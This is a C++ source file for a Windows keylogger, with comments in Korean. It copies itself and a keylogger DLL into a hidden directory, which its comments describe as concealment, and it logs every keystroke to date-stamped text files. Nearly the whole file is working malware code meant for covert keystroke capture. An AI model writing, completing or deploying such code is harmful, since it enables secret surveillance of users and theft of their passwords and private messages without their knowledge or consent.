#include "pch.h"
#include <iostream>
#include <windows.h>
#include <direct.h>
#include <fstream>
#include <time.h>

#define KEYLOGGER_DLL "KeyloggerDll.dll"
using namespace std;

static string static_migrate_path;

void getSystemVolume(TCHAR *vol)
{
	TCHAR buffer[30];

	GetSystemWindowsDirectory(buffer, 30);
	for (int i = 0; i < 2; i++)
	{
		vol[i] = buffer[i];
	}
	vol[2] = 0;
}

void migration(char *filepath) {	// 은신을 위한 파일 복제 함수
	TCHAR vol[3];
	char tmp_filepath[MAX_PATH];
	char *filename = NULL;
	string path = "\\Programs\\";

	GetModuleFileNameA(NULL, filepath, MAX_PATH);
	GetModuleFileNameA(NULL, tmp_filepath, MAX_PATH);
	getSystemVolume(vol);
	wstring volume(&vol[0]);
	string migrate_path(volume.begin(), volume.end());
	
	migrate_path.append(path);
	static_migrate_path = migrate_path;

	ifstream dll_src(KEYLOGGER_DLL, ios::binary);					// dll 은닉
	ofstream dll_dst(migrate_path + KEYLOGGER_DLL, ios::binary);
	dll_dst << dll_src.rdbuf();

	CreateDirectoryA(migrate_path.c_str(), NULL);
	SetFileAttributesA(migrate_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
	char *ptr = strtok(filepath, "\\");
	while (ptr != NULL) {
		filename = ptr;		// while문 마지막에 들어간 ptr 값이 filename
		ptr = strtok(NULL, "\\");
	}
	//migrate_path.append(filename);
	ifstream app_src(tmp_filepath, ios::binary);
	ofstream app_dst(migrate_path+filename, ios::binary);					// app 은닉
	
	app_dst << app_src.rdbuf();
}

const string currentDateTime(int flags) {
	time_t     now = time(0); //현재 시간을 time_t 타입으로 저장
	struct tm  tstruct;
	char       buf[80];
	tstruct = *localtime(&now);
	if (flags == 1) {
		strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct); // YYYY-MM-DD 형태의 스트링
	}
	else if (flags == 2) {
		strftime(buf, sizeof(buf), "%Y-%m-%d-%H.txt", &tstruct); // YYYY-MM-DD-HH 형태의 스트링
	}

	return buf;
}

int treatKey(string charPressed)
{
	string Date = currentDateTime(1);	// 하루단위 폴더 생성을 위한 시간 구하기
	string DateTime = currentDateTime(2);	// 시간단위 파일 생성을 위한 시간 구하기
	FILE *FP;
	_mkdir((static_migrate_path + Date).c_str());
	fopen_s(&FP, (static_migrate_path + Date + "\\" + DateTime).c_str(), "a");
	fprintf(FP, "%s", charPressed.c_str());
	fclose(FP);
	return 0;
}